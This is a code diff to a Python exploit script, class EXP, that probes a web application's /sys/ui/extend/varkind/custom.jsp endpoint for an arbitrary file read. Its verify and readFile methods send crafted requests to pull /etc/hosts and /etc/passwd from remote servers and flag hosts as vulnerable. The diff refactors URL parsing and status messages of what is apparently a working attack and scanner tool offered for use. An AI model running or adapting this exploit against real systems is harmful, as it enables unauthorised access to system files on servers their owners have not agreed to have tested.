@@ -13,6 +13,7 @@ class EXP:
     def __init__(self):
         self.banner()
         self.args = self.parseArgs()
+        self.url = self.args.url
         print("timeout:", self.args.timeout)
         self.hasVuln = False
         self.exploit()
@@ -49,33 +50,28 @@ class EXP:
 
     # 验证漏洞
     def verify(self):
-        try:
-            self.url = self.args.url.replace("http://", "")
-        except:
-            try:
-                self.url = self.args.url.replace("https://", "")
-            except:
-                pass
-        try:
-            reqURL = "http://" + self.url + "/sys/ui/extend/varkind/custom.jsp"
-            requests.get(url=reqURL, timeout=self.args.timeout)
-        except:
-            print(f"[-] {self.url} cannot be connected\n")
-            return
-        if "127.0.0.1" in self.readFile("/etc/hosts"):
-            msg = f"\033[32m[+] {self.url} Exist Vulnerability !\033[0m\n"
+        self.url = self.url.replace("http://", "") if "http://" in self.url else self.url
+        self.url = self.url.replace("https://", "") if "https://" in self.url else self.url
+        repData = self.readFile("/etc/hosts")
+        if "127.0.0.1" in repData:
+            msg = f"\033[32m[+] [ Vuln ]  {self.url}\033[0m"
             self.hasVuln = True
+        elif "Conn" == repData:
+            msg = f"\033[31m[!] [ Conn ]  {self.url}\033[0m"
         else:
-            if "root" in self.readFile("/etc/passwd"):
-                msg = f"\033[32m[+] {self.url} Exist Vulnerability !\033[0m\n"
+            repData = self.readFile("/etc/passwd")
+            if "root" in repData:
+                msg = f"\033[32m[+] [ Vuln ]  {self.url}\033[0m"
                 self.hasVuln = True
+            elif "Conn" == repData:
+                msg = f"\033[31m[!] [ Conn ]  {self.url}\033[0m"
             else:
-                msg = f"[-] {self.url} is safe\n"
+                msg = f"[-] [ Safe ]  {self.url}"
         print(msg)
 
     # 读取文件
-    def readFile(self,filename):
-        reqURL = "http://" + self.args.url + "/sys/ui/extend/varkind/custom.jsp"
+    def readFile(self, filename):
+        reqURL = "http://" + self.url + "/sys/ui/extend/varkind/custom.jsp"
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
             "Content-Type": "application/x-www-form-urlencoded"
@@ -86,7 +82,7 @@ class EXP:
             fileData = rep.text
             return fileData
         except:
-            return ""
+            return "Conn"
 
     # 攻击
     def exploit(self):
